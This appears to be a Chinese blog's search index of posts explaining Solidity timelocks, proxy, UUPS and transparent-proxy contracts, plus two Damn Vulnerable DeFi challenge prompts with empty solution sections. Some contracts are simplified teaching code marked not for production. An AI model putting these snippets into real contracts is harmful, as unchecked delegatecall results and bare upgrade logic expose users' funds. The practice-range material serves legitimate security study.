{"meta":{"title":"笔友🍉の知识库","subtitle":"","description":"Self-Discipline","author":"笔友🍉","url":"https://biyouqiuqiu.com","root":"/"},"pages":[{"title":"所有分类","date":"2023-05-31T23:45:51.441Z","updated":"2023-05-31T23:45:51.441Z","comments":true,"path":"categories/index.html","permalink":"https://biyouqiuqiu.com/categories/index.html","excerpt":"","text":""},{"title":"Good article recommended","date":"2023-04-07T00:59:10.000Z","updated":"2023-04-07T00:59:10.000Z","comments":true,"path":"collectings/Good article recommended.html","permalink":"https://biyouqiuqiu.com/collectings/Good%20article%20recommended.html","excerpt":"","text":"Good article recommended1. 关于 EVM的存储，storage 和 slot：https://learnblockchain.cn/article/42662. 以太坊智能合约中随机数预测: https://www.freebuf.com/vuls/179173.html3. 有关数组在内存的储存 ：https://learnblockchain.cn/article/45744. 与动态数组存储、结构体相关且求数组的存储位置的：https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/ 5. 一个智能合约可以存储256bit的key（2 ^ 256个key），每个key可以存储256bit的value，即2^261bytes 的数据6. 以太坊中的签名和认证7. 以太坊：账户交易过程分析"},{"title":"","date":"2023-05-31T23:45:14.074Z","updated":"2023-05-31T23:45:14.074Z","comments":true,"path":"about/index.html","permalink":"https://biyouqiuqiu.com/about/index.html","excerpt":"","text":""},{"title":"随笔","date":"2023-06-02T02:19:31.985Z","updated":"2023-06-02T02:19:31.985Z","comments":true,"path":"informal essay/index.html","permalink":"https://biyouqiuqiu.com/informal%20essay/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2023-05-31T23:46:33.843Z","updated":"2023-05-31T23:46:33.843Z","comments":true,"path":"friends/index.html","permalink":"https://biyouqiuqiu.com/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"},{"title":"所有标签","date":"2023-06-01T04:44:20.604Z","updated":"2023-06-01T04:44:20.604Z","comments":true,"path":"tags/index.html","permalink":"https://biyouqiuqiu.com/tags/index.html","excerpt":"","text":""},{"title":"good_articles","date":"2023-06-02T02:50:09.608Z","updated":"2023-06-02T02:50:09.608Z","comments":true,"path":"collectings/index.html","permalink":"https://biyouqiuqiu.com/collectings/index.html","excerpt":"","text":""}],"posts":[{"title":"Timelock","slug":"Knowledge literacy/proxy contract/Timelock","date":"2023-07-20T04:47:10.000Z","updated":"2023-07-20T04:47:10.000Z","comments":true,"path":"2023/07/20/Knowledge literacy/proxy contract/Timelock/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/20/Knowledge%20literacy/proxy%20contract/Timelock/","excerpt":"","text":"1. 时间锁概念时间锁（Timelock）是银行金库和其他高安全性容器中常见的锁定机制。它是一种计时器，旨在防止保险箱或保险库在预设时间之前被打开，即便开锁的人知道正确密码。 在区块链，时间锁被DeFi和DAO大量采用。它是一段代码，他可以将智能合约的某些功能锁定一段时间。它可以大大改善智能合约的安全性，举个例子，假如一个黑客黑了Uniswap的多签，准备提走金库的钱，但金库合约加了2天锁定期的时间锁，那么黑客从创建提钱的交易，到实际把钱提走，需要2天的等待期。在这一段时间，项目方可以找应对办法，投资者可以提前抛售代币减少损失。 2. 时间锁合约时间锁Timelock合约 在创建Timelock合约时，项目方可以设定锁定期，并把合约的管理员设为自己。 时间锁主要有三个功能： 创建交易，并加入到时间锁队列。 在交易的锁定期满后，执行交易。 后悔了，取消时间锁队列中的某些交易。 项目方一般会把时间锁合约设为重要合约的管理员，例如金库合约，再通过时间锁操作他们。 时间锁合约的管理员一般为项目的多签钱包，保证去中心化 状态变量 admin：管理员地址。 delay：锁定期。 GRACE_PERIOD：交易过期时间。如果交易到了执行的时间点，但在GRACE_PERIOD没有被执行，就会过期。 queuedTransactions：进入时间锁队列交易的标识符txHash到bool的映射，记录所有在时间锁队列中的交易 修饰器 onlyOwner()：被修饰的函数只能被管理员执行。 onlyTimelock()：被修饰的函数只能被时间锁合约执行。 函数 构造函数：初始化交易锁定时间（秒）和管理员地址。 queueTransaction()：创建交易并添加到时间锁队列中。参数比较复杂，因为要描述一个完整的交易： target：目标合约地址 value：发送ETH数额 signature：调用的函数签名（function signature） data：交易的call data executeTime：交易执行的区块链时间戳。 调用这个函数时，要保证交易预计执行时间executeTime大于当前区块链时间戳+锁定时间delay。交易的唯一标识符为所有参数的哈希值，利用getTxHash()函数计算。进入队列的交易会更新在queuedTransactions变量中，并释放QueueTransaction事件。 executeTransaction()：执行交易。它的参数与queueTransaction()相同。要求被执行的交易在时间锁队列中，达到交易的执行时间，且没有过期。执行交易时用到了solidity的低级成员函数call，在第22讲中有介绍。 cancelTransaction()：取消交易。它的参数与queueTransaction()相同。它要求被取消的交易在队列中，会更新queuedTransactions并释放CancelTransaction事件。 changeAdmin()：修改管理员地址，只能被Timelock合约调用。 getBlockTimestamp()：获取当前区块链时间戳。 getTxHash()：返回交易的标识符，为很多交易参数的hash 代码分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Timelock&#123; // 事件 // 交易取消事件 event CancelTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime); // 交易执行事件 event ExecuteTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime); // 交易创建并进入队列 事件 event QueueTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime); // 修改管理员地址的事件 event NewAdmin(address indexed newAdmin); // 状态变量 address public admin; // 管理员地址 uint public constant GRACE_PERIOD = 7 days; // 交易有效期，过期的交易作废 uint public delay; // 交易锁定时间 （秒） mapping (bytes32 =&gt; bool) public queuedTransactions; // txHash到bool，记录所有在时间锁队列中的交易 // onlyOwner modifier modifier onlyOwner() &#123; require(msg.sender == admin, &quot;Timelock: Caller not admin&quot;); _; &#125; // onlyTimelock modifier modifier onlyTimelock() &#123; require(msg.sender == address(this), &quot;Timelock: Caller not Timelock&quot;); _; &#125; /** * @dev 构造函数，初始化交易锁定时间 （秒）和管理员地址 */ constructor(uint delay_) &#123; delay = delay_; admin = msg.sender; &#125; /** * @dev 改变管理员地址，调用者必须是Timelock合约。 */ function changeAdmin(address newAdmin) public onlyTimelock &#123; admin = newAdmin; emit NewAdmin(newAdmin); &#125; /** * @dev 创建交易并添加到时间锁队列中。 * @param target: 目标合约地址 * @param value: 发送eth数额 * @param signature: 要调用的函数签名（function signature） * @param data: call data，里面是一些参数 * @param executeTime: 交易执行的区块链时间戳 * * 要求：executeTime 大于 当前区块链时间戳+delay */ function queueTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner returns (bytes32) &#123; // 检查：交易执行时间满足锁定时间 require(executeTime &gt;= getBlockTimestamp() + delay, &quot;Timelock::queueTransaction: Estimated execution block must satisfy delay.&quot;); // 计算交易的唯一识别符：一堆东西的hash bytes32 txHash = getTxHash(target, value, signature, data, executeTime); // 将交易添加到队列 queuedTransactions[txHash] = true; emit QueueTransaction(txHash, target, value, signature, data, executeTime); return txHash; &#125; /** * @dev 取消特定交易。 * * 要求：交易在时间锁队列中 */ function cancelTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner&#123; // 计算交易的唯一识别符：一堆东西的hash bytes32 txHash = getTxHash(target, value, signature, data, executeTime); // 检查：交易在时间锁队列中 require(queuedTransactions[txHash], &quot;Timelock::cancelTransaction: Transaction hasn&#x27;t been queued.&quot;); // 将交易移出队列 queuedTransactions[txHash] = false; emit CancelTransaction(txHash, target, value, signature, data, executeTime); &#125; /** * @dev 执行特定交易。 * * 要求： * 1. 交易在时间锁队列中 * 2. 达到交易的执行时间 * 3. 交易没过期 */ function executeTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public payable onlyOwner returns (bytes memory) &#123; bytes32 txHash = getTxHash(target, value, signature, data, executeTime); // 检查：交易是否在时间锁队列中 require(queuedTransactions[txHash], &quot;Timelock::executeTransaction: Transaction hasn&#x27;t been queued.&quot;); // 检查：达到交易的执行时间 require(getBlockTimestamp() &gt;= executeTime, &quot;Timelock::executeTransaction: Transaction hasn&#x27;t surpassed time lock.&quot;); // 检查：交易没过期 require(getBlockTimestamp() &lt;= executeTime + GRACE_PERIOD, &quot;Timelock::executeTransaction: Transaction is stale.&quot;); // 将交易移出队列 queuedTransactions[txHash] = false; // 获取call data bytes memory callData; if (bytes(signature).length == 0) &#123; callData = data; &#125; else &#123; callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data); &#125; // 利用call执行交易 (bool success, bytes memory returnData) = target.call&#123;value: value&#125;(callData); require(success, &quot;Timelock::executeTransaction: Transaction execution reverted.&quot;); emit ExecuteTransaction(txHash, target, value, signature, data, executeTime); return returnData; &#125; /** * @dev 获取当前区块链时间戳 */ function getBlockTimestamp() public view returns (uint) &#123; return block.timestamp; &#125; /** * @dev 将一堆东西拼成交易的标识符 */ function getTxHash( address target, uint value, string memory signature, bytes memory data, uint executeTime ) public pure returns (bytes32) &#123; return keccak256(abi.encode(target, value, signature, data, executeTime)); &#125;&#125; 3. Remix演示演示 4. 参考博客WTF-TimeLock","categories":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/"}],"tags":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/tags/Knowledge-literacy/"},{"name":"Timelock","slug":"Timelock","permalink":"https://biyouqiuqiu.com/tags/Timelock/"}]},{"title":"Climber","slug":"Smart contracts/damn defi/Climber","date":"2023-07-20T03:37:10.000Z","updated":"2023-07-20T03:37:10.000Z","comments":true,"path":"2023/07/20/Smart contracts/damn defi/Climber/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/20/Smart%20contracts/damn%20defi/Climber/","excerpt":"","text":"1. issue There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern. The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days. On the vault there’s an additional role with powers to sweep all tokens in case of an emergency. On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later. To pass this challenge, take all tokens from the vault. 要求：从保险库中取出所有代币 题目链接 2. analysing3. solving","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Backdoor","slug":"Smart contracts/damn defi/Backdoor","date":"2023-07-20T02:37:10.000Z","updated":"2023-07-20T02:37:10.000Z","comments":true,"path":"2023/07/20/Smart contracts/damn defi/Backdoor/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/20/Smart%20contracts/damn%20defi/Backdoor/","excerpt":"","text":"1. issue To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens. To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks. Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them. Your goal is to take all funds from the registry. In a single transaction. 目标：在单笔交易中，将 注册表中的资金全部掏空 题目链接 2. analysing不会。。。。。 3. solving","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"damn defi","slug":"Smart-contracts/damn-defi","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Upgradeable Contract","slug":"Knowledge literacy/proxy contract/Upgradeable_Contract","date":"2023-07-19T08:47:10.000Z","updated":"2023-07-19T08:47:10.000Z","comments":true,"path":"2023/07/19/Knowledge literacy/proxy contract/Upgradeable_Contract/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/19/Knowledge%20literacy/proxy%20contract/Upgradeable_Contract/","excerpt":"","text":"1. 可升级合约 在理解可升级合约之前，需要先去了解代理合约。 实现逻辑(通过替换代理合约中引用的逻辑合约)： 简单实现 包含3个合约：代理合约，旧的逻辑合约，和新的逻辑合约。 代理合约它包含3个变量： implementation：逻辑合约地址。 admin：admin地址。 words：字符串，可以通过逻辑合约的函数改变。 它包含3个函数 构造函数：初始化admin和逻辑合约地址。 fallback()：回调函数，将调用委托给逻辑合约。 upgrade()：升级函数，改变逻辑合约地址，只能由admin调用。 12345678910111213141516171819202122232425262728// SPDX-License-Identifier: MIT// wtf.academypragma solidity ^0.8.4;// 简单的可升级合约，管理员可以通过升级函数更改逻辑合约地址，从而改变合约的逻辑。// 教学演示用，不要用在生产环境contract SimpleUpgrade &#123; address public implementation; // 逻辑合约地址 address public admin; // admin地址 string public words; // 字符串，可以通过逻辑合约的函数改变 // 构造函数，初始化admin和逻辑合约地址 constructor(address _implementation)&#123; admin = msg.sender; implementation = _implementation; &#125; // fallback函数，将调用委托给逻辑合约 fallback() external payable &#123; (bool success, bytes memory data) = implementation.delegatecall(msg.data); &#125; // 升级函数，改变逻辑合约地址，只能由admin调用 function upgrade(address newImplementation) external &#123; require(msg.sender == admin); implementation = newImplementation; &#125;&#125; 旧逻辑合约这个逻辑合约包含3个状态变量，与保持代理合约一致，防止插槽冲突。它只有一个函数foo()，将代理合约中的words的值改为&quot;old&quot;。 123456789101112// 逻辑合约1contract Logic1 &#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器： 0xc2985578 function foo() public&#123; words = &quot;old&quot;; &#125;&#125; 新逻辑合约123456789101112// 逻辑合约2contract Logic2 &#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器：0xc2985578 function foo() public&#123; words = &quot;new&quot;; &#125;&#125; remix代码演示： remix实现 2. 通用可升级代理前言代理合约中选择器冲突（Selector Clash）的另一个解决办法：通用可升级代理（UUPS，universal upgradeable proxy standard）。 知识点： 在合约中函数不能定义一样的，即函数名一样，形参一样，这样导致的后果是编译报错。在合约中，一样的判断标准为 selector，计算出函数选择器作比较。即使是两个完全不一样的函数，函数选择器相同也是不能声明在同一个合约中。 如下例： 所以这一特性，将为UUPS的实现提供了可行性。 UUPS的概念UUPS（universal upgradeable proxy standard，通用可升级代理）将升级函数放在逻辑合约中。这样一来，如果有其它函数与升级函数存在“选择器冲突”，编译时就会报错。即保证了在逻辑合约中不出现两个函数选择器相同的情况。 可升级合约，透明代理，UUPS的不同点 UUPS 合约如果用户A通过合约B（代理合约）去delegatecall合约C（逻辑合约），上下文仍是合约B的上下文，msg.sender仍是用户A而不是合约B。因此，UUPS合约可以将升级函数放在逻辑合约中，并检查调用者是否为管理员。 UUPS的代理合约UUPS的代理合约看起来像是个不可升级的代理合约，非常简单，因为升级函数被放在了逻辑合约中。它包含3个变量： implementation：逻辑合约地址。 admin：admin地址。 words：字符串，可以通过逻辑合约的函数改变。 它包含2个函数 构造函数：初始化admin和逻辑合约地址。 fallback()：回调函数，将调用委托给逻辑合约。 12345678910111213141516contract UUPSProxy &#123; address public implementation; // 逻辑合约地址 address public admin; // admin地址 string public words; // 字符串，可以通过逻辑合约的函数改变 // 构造函数，初始化admin和逻辑合约地址 constructor(address _implementation)&#123; admin = msg.sender; implementation = _implementation; &#125; // fallback函数，将调用委托给逻辑合约 fallback() external payable &#123; (bool success, bytes memory data) = implementation.delegatecall(msg.data); &#125;&#125; UUPS的逻辑合约UUPS的逻辑合约与第47讲中的不同是多了个升级函数。UUPS逻辑合约包含3个状态变量，与保持代理合约一致，防止插槽冲突。它包含2个 upgrade()：升级函数，将改变逻辑合约地址implementation，只能由admin调用。 foo()：旧UUPS逻辑合约会将words的值改为&quot;old&quot;，新的会改为&quot;new&quot;。 123456789101112131415161718192021222324252627282930313233343536373839// UUPS逻辑合约（升级函数写在逻辑合约内）contract UUPS1&#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器： 0xc2985578 function foo() public&#123; words = &quot;old&quot;; &#125; // 升级函数，改变逻辑合约地址，只能由admin调用。选择器：0x0900f010 // UUPS中，逻辑合约中必须包含升级函数，不然就不能再升级了。 function upgrade(address newImplementation) external &#123; require(msg.sender == admin); implementation = newImplementation; &#125;&#125;// 新的UUPS逻辑合约contract UUPS2&#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器： 0xc2985578 function foo() public&#123; words = &quot;new&quot;; &#125; // 升级函数，改变逻辑合约地址，只能由admin调用。选择器：0x0900f010 // UUPS中，逻辑合约中必须包含升级函数，不然就不能再升级了。 function upgrade(address newImplementation) external &#123; require(msg.sender == admin); implementation = newImplementation; &#125;&#125; 解读： 这是通过在逻辑合约中实现代码的升级，确保了升级函数和 msg.data不冲突。 调用逻辑合约中的 upgrade()函数，并传入新的逻辑合约，即可实现 修改Proxy合约的逻辑合约地址。 Remix实现参考博客link1 link2","categories":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/"},{"name":"proxy contract","slug":"Knowledge-literacy/proxy-contract","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/proxy-contract/"}],"tags":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/tags/Knowledge-literacy/"},{"name":"Upgradeable","slug":"Upgradeable","permalink":"https://biyouqiuqiu.com/tags/Upgradeable/"}]},{"title":"Proxy Contract No.1","slug":"Knowledge literacy/proxy contract/Proxy_Contract","date":"2023-07-19T01:47:10.000Z","updated":"2023-07-19T01:47:10.000Z","comments":true,"path":"2023/07/19/Knowledge literacy/proxy contract/Proxy_Contract/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/19/Knowledge%20literacy/proxy%20contract/Proxy_Contract/","excerpt":"","text":"代理合约1. 代理模式 solidity合约部署到链上之后，代码是不可变的。 这一特性存在了一个严重的缺点：就算合约中存在bug，也不能修改或者升级，只能部署新合约。但是新合约的地址和旧合约的地址不一样，而且合约的数据也需要花费大量的gas进行迁移。 为了解决这一问题，从而引入了 代理模式这一概念。 代理模式将合约数据和逻辑分开，分别保存在不同的合约中。以上图为例，数据（状态变量）存储在代理合约中，而逻辑（函数）保存在另一个逻辑合约中。逻辑合约（Proxy）通过delegatecall，将函数调用全权委托给逻辑合约（Implementation）执行，再把最终的结果返回给调用者（Caller）。 2. 代理合约它由OpenZeppelin的Proxy合约简化而来。它有三个部分：代理合约Proxy，逻辑合约Logic，和一个调用示例Caller。它的逻辑并不复杂： 首先部署逻辑合约Logic。 创建代理合约Proxy，状态变量implementation记录Logic合约地址。 Proxy合约利用回调函数fallback，将所有调用委托给Logic合约 最后部署调用示例Caller合约，调用Proxy合约。 注意：Logic合约和Proxy合约的状态变量存储结构相同，不然delegatecall会产生意想不到的行为，有安全隐患 逻辑合约Logic implementation：占位变量，与Proxy合约保持一致，防止插槽冲突。 x：uint变量，被设置为99。 CallSuccess事件：在调用成功时释放。 increment()函数：会被Proxy合约调用，释放CallSuccess事件，并返回一个uint，它的selector为0xd09de08a。即 abi.encodeWithSignature(&quot;increment()&quot;)&#x3D; 0xd09de08a。 123456789101112131415/** * @dev 逻辑合约，执行被委托的调用 */contract Logic &#123; address public implementation; // 与Proxy保持一致，防止插槽冲突 uint public x = 99; event CallSuccess(); // 调用成功事件 // 这个函数会释放CallSuccess事件并返回一个uint。 // 函数selector: 0xd09de08a function increment() external returns(uint) &#123; emit CallSuccess(); return x + 1; &#125;&#125; 解读： Logic函数是提供函数的，用于服务调用者，进行一些数据的修改之类的。而逻辑合约也是最容易出现bug或需要升级的合约。 调用者合约Caller它有1个变量，2个函数： proxy：状态变量，记录代理合约地址。 构造函数：在部署合约时初始化proxy变量。 increase()：利用call来调用代理合约的increment()函数，并返回一个uint。在调用时，我们利用abi.encodeWithSignature()获取了increment()函数的selector。在返回时，利用abi.decode()将返回值解码为uint类型。 12345678910111213141516/** * @dev Caller合约，调用代理合约，并获取执行结果 */contract Caller&#123; address public proxy; // 代理合约地址 constructor(address proxy_)&#123; proxy = proxy_; &#125; // 通过代理合约调用increment()函数 function increment() external returns(uint) &#123; ( , bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;increment()&quot;)); return abi.decode(data,(uint)); &#125;&#125; 解读： ( , bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;increment()&quot;)); 表示通过proxy调用 Proxy中的 increment()函数，此时对于Proxy合约来说，msg.data 是 abi.encodeWithSignature(&quot;increment()&quot;) 代理合约Proxy用到了内联汇编，因此比较难理解。它只有一个状态变量，一个构造函数，和一个回调函数。状态变量implementation，在构造函数中初始化，用于保存Logic合约地址。 Proxy的回调函数将外部对本合约的调用委托给 Logic 合约。这个回调函数很别致，它利用内联汇编（inline assembly），让本来不能有返回值的回调函数有了返回值。其中用到的内联汇编操作码： calldatacopy(t, f, s)：将calldata（输入数据）从位置f开始复制s字节到mem（内存）的位置t。 delegatecall(g, a, in, insize, out, outsize)：调用地址a的合约，输入为mem[in..(in+insize)) ，输出为mem[out..(out+outsize))， 提供gwei的以太坊gas。这个操作码在错误时返回0，在成功时返回1。 returndatacopy(t, f, s)：将returndata（输出数据）从位置f开始复制s字节到mem（内存）的位置t。 switch：基础版if/else，不同的情况case返回不同值。可以有一个默认的default情况。 return(p, s)：终止函数执行, 返回数据mem[p..(p+s))。 revert(p, s)：终止函数执行, 回滚状态，返回数据mem[p..(p+s))。 123456789101112131415161718192021222324252627282930313233343536373839404142contract Proxy &#123; address public implementation; // 逻辑合约地址。implementation合约同一个位置的状态变量类型必须和Proxy合约的相同，不然会报错。 /** * @dev 初始化逻辑合约地址 */ constructor(address implementation_)&#123; implementation = implementation_; &#125; /*** @dev 回调函数，将本合约的调用委托给 `implementation` 合约* 通过assembly，让回调函数也能有返回值*/fallback() external payable &#123; address _implementation = implementation; assembly &#123; // 将msg.data拷贝到内存里 // calldatacopy操作码的参数: 内存起始位置，calldata起始位置，calldata长度 calldatacopy(0, 0, calldatasize()) // 利用delegatecall调用implementation合约 // delegatecall操作码的参数：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度 // output area起始位置和长度位置，所以设为0 // delegatecall成功返回1，失败返回0 let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) // 将return data拷贝到内存 // returndata操作码的参数：内存起始位置，returndata起始位置，returndata长度 returndatacopy(0, 0, returndatasize()) switch result // 如果delegate call失败，revert case 0 &#123; revert(0, returndatasize()) &#125; // 如果delegate call成功，返回mem起始位置为0，长度为returndatasize()的数据（格式为bytes） default &#123; return(0, returndatasize()) &#125; &#125;&#125; 解读： 分析 fallback()函数 123456789101112131415161718192021222324252627fallback() external payable &#123; address _implementation = implementation; assembly &#123; // 将msg.data拷贝到内存里 // calldatacopy操作码的参数: 内存起始位置，calldata起始位置，calldata长度 calldatacopy(0, 0, calldatasize()) // 利用delegatecall调用implementation合约 // delegatecall操作码的参数：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度 // output area起始位置和长度位置，所以设为0 // delegatecall成功返回1，失败返回0 let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) // 将return data拷贝到内存 // returndata操作码的参数：内存起始位置，returndata起始位置，returndata长度 returndatacopy(0, 0, returndatasize()) switch result // 如果delegate call失败，revert case 0 &#123; revert(0, returndatasize()) &#125; // 如果delegate call成功，返回mem起始位置为0，长度为returndatasize()的数据（格式为bytes） default &#123; return(0, returndatasize()) &#125; &#125; fallback函数用于处理调用者在调用该合约中不具备的函数时被触发。其中的代码逻辑是：内联汇编处理调用者的msg.data，通过解析 msg.data调用其中包含的函数，比如此例中，msg.data便是 函数increment()的选择器，它是用来唯一识别合约中的函数，合约调用哪个函数由调用者决定，即使该合约被部署到链上，但是仍然可以通过传入不同的代理逻辑合约的地址，实现不同的功能。从而实现合约的升级。又由于采用的是 delegatecall的调用方式，使得将作用结果呈现给调用者。 这个代理合约Proxy真的很牛，特别是这个内联汇编的使用，极大的提高了合约的兼容性！！！ Remix演示透明代理 知识点： 如果在代理合约和逻辑合约中有相同的函数（选择器相同），且代理合约通过 delegatecall 去调用逻辑合约中的与代理合约相同的函数时，代理合约会优先调用本合约中的函数。 验证如下： 12345678910111213141516171819202122232425262728293031contract Proxy &#123; uint public result; address logic; constructor(address _logic) &#123; logic = _logic; &#125; function delegatecall() public &#123; result = 999; &#125; fallback() external &#123; (bool success, bytes memory data) = logic.delegatecall(msg.data); &#125;&#125;contract Logic &#123; uint public result; address proxy; // 0xbc957fda function delegatecall() public &#123; result = 666; &#125; function calSelector(string memory _funName) external pure returns(bytes4) &#123; return bytes4(abi.encodeWithSignature(_funName)); &#125;&#125; Proxy 和 Logic 中都有 delegatecall 函数，通过Proxy去调用Logic中的 delegatecall 当然 使用 call来调用也是同理 1. 选择器冲突智能合约中，函数选择器（selector）是函数签名的哈希的前4个字节。例如mint(address account)的选择器为bytes4(keccak256(&quot;mint(address)&quot;))，也就是0x6a627842。更多关于选择器的内容见WTF Solidity极简教程第29讲：函数选择器 由于函数选择器仅有4个字节，范围很小，因此两个不同的函数可能会有相同的选择器，例如下面两个函数： 12345// 选择器冲突的例子contract Foo &#123; function burn(uint256) external &#123;&#125; function collate_propagate_storage(bytes16) external &#123;&#125;&#125; 示例中，函数burn()和collate_propagate_storage()的选择器都为0x42966c68，是一样的，这种情况被称为“选择器冲突”。在这种情况下，EVM无法通过函数选择器分辨用户调用哪个函数，因此该合约无法通过编译。 由于代理合约和逻辑合约是两个合约，就算他们之间存在“选择器冲突”也可以正常编译，这可能会导致很严重的安全事故。举个例子，如果逻辑合约的a函数和代理合约的升级函数的选择器相同，那么管理人就会在调用a函数的时候，将代理合约升级成一个黑洞合约，后果不堪设想。 如何理解呢，假设在某种情况下，Prxoy中的 upgrade函数的 选择器 abi.encodeWithSignature(upgrade(address))的值，和 msg.data的值相同的话，函数则会选择调用upgrade函数，而不会执行 msg.data中的函数。如若在 msg.data中包含了参数，且该参数是地址类型，执行(bool success, bytes memory data) = implementation.delegatecall(msg.data);则会将合约中的逻辑合约的地址给修改，从而导致合约损坏。 目前，有两个可升级合约标准解决了这一问题：透明代理Transparent Proxy和通用可升级代理UUPS 2. 透明代理概念透明代理的逻辑非常简单：管理员可能会因为“函数选择器冲突”，在调用逻辑合约的函数时，误调用代理合约的可升级函数。那么限制管理员的权限，不让他调用任何逻辑合约的函数，就能解决冲突： 管理员变为工具人，仅能调用代理合约的可升级函数对合约升级，不能通过回调函数调用逻辑合约。 其它用户不能调用可升级函数，但是可以调用逻辑合约的函数。 3. 代理合约这里的代理合约和第47讲的非常相近，只是fallback()函数限制了管理员地址的调用。 它包含3个变量： implementation：逻辑合约地址。 admin：admin地址。 words：字符串，可以通过逻辑合约的函数改变。 它包含3个函数 构造函数：初始化admin和逻辑合约地址。 fallback()：回调函数，将调用委托给逻辑合约，不能由admin调用。 upgrade()：升级函数，改变逻辑合约地址，只能由admin调用。 12345678910111213141516171819202122232425// 透明可升级合约的教学代码，不要用于生产。contract TransparentProxy &#123; address implementation; // logic合约地址 address admin; // 管理员 string public words; // 字符串，可以通过逻辑合约的函数改变 // 构造函数，初始化admin和逻辑合约地址 constructor(address _implementation)&#123; admin = msg.sender; implementation = _implementation; &#125; // fallback函数，将调用委托给逻辑合约 // 不能被admin调用，避免选择器冲突引发意外 fallback() external payable &#123; require(msg.sender != admin); (bool success, bytes memory data) = implementation.delegatecall(msg.data); &#125; // 升级函数，改变逻辑合约地址，只能由admin调用 function upgrade(address newImplementation) external &#123; if (msg.sender != admin) revert(); implementation = newImplementation; &#125;&#125; 4. 逻辑合约这里的新、旧逻辑合约与第47讲一样。逻辑合约包含3个状态变量，与保持代理合约一致，防止插槽冲突；包含一个函数foo()，旧逻辑合约会将words的值改为&quot;old&quot;，新的会改为&quot;new&quot;。 12345678910111213141516171819202122232425// 旧逻辑合约contract Logic1 &#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器： 0xc2985578 function foo() public&#123; words = &quot;old&quot;; &#125;&#125;// 新逻辑合约contract Logic2 &#123; // 状态变量和proxy合约一致，防止插槽冲突 address public implementation; address public admin; string public words; // 字符串，可以通过逻辑合约的函数改变 // 改变proxy中状态变量，选择器：0xc2985578 function foo() public&#123; words = &quot;new&quot;; &#125;&#125; Remix实现深度学习link 参考博客WTFproxyContract","categories":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/"},{"name":"proxy contract","slug":"Knowledge-literacy/proxy-contract","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/proxy-contract/"}],"tags":[{"name":"Knowledge 